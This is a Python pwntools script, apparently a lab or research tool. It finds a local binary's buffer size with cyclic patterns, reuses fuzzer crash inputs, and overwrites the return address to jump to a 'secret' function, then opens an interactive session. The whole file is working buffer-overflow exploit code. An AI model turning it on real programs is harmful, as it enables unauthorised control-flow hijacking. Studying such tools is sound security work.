import pwn
import os, sys

def getBufferSize() :
    # get rough size of buffer
    bufferSize = 0
    overflow = False
    while( True ) :
        try :
            p = pwn.process( str(sys.argv[1]) )
            p.readuntil(b': ')
            bufferSize += 1
            p.sendline(pwn.cyclic(bufferSize))
            p.readline()
            p.close()
        except :
            print( "Buffer Overflow Detected!" )
            p.close()
            return bufferSize

def getPathOfCrashInput() :
    # path = "/home/test/Desktop/O0_crashes"
    # path = "/home/test/Desktop/O2_crashes"
    path = sys.argv[-1]
    dir_list = os.listdir(path)
    for i in range( len( dir_list ) ) :
        dir_list[i] = path + "/" + dir_list[i]
    return dir_list


def getCrashData() :
    roughBufferSize = getBufferSize()
    crashInputList = getPathOfCrashInput()
    crash_list = []
    crash_data = []
    for i in range( len( crashInputList ) ) :
        with open( crashInputList[i],'rb') as f :
            data = f.read()
            if ( len( data ) > roughBufferSize ) :
                # crash_list.append( crashInputList[i] )
                crash_data.append( data )
    return crash_data

def gdbForCheck( p ) :
    # open up gdb to check return address of result

    try :
        secret = p.read()
        s = str( secret )
        if ( s.find( 'secret' ) == -1  ) :
            print( 'No secret here!' )
            p.close()
            return "No"
        else :
            print( secret )
            p.close()
            return "Secret"
    except :
        print( "An Exception in gdbForCheck()" )
        p.close()

def exploitUI( bufferSize, crash, target ) :
    # modify the payload
    for i in range( bufferSize, len( crash ) ) :
        try :
            p = pwn.process( str(sys.argv[1]) )
            p.readuntil(b': ')
            truncated = crash[:i]
            payload = truncated + target
            p.sendline( payload )
            secret = p.read()
            s = str( secret )
            if ( s.find( 'secret' ) == -1 ) :
                p.close()
            else :
                p.close()
                return "Success", payload
        except :
            print( "An Exception in exploitUI()" )
    return "No", 0



def controlFlowHijack() :
    # get crash data
    bufferSize = getBufferSize()
    crashes = getCrashData()

    target = str( input('Enter the target address that you want to jump: ') )
    target = pwn.p64( int(target, 16) )

    # check the return address that the crash input provides
    for crash in crashes :
        try :
            result, payload = exploitUI( bufferSize, crash, target )
            if ( result == 'Success' ) :
                return payload
            else :
                continue
        except :
            print( "An Exception in controlFlowHijack()" )

def main():
    payload = controlFlowHijack()
    p = pwn.process( str(sys.argv[1]) )
    p.readuntil(b': ')
    pwn.info( "[+] Successfully reach the secret!" )
    pwn.pause()
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()

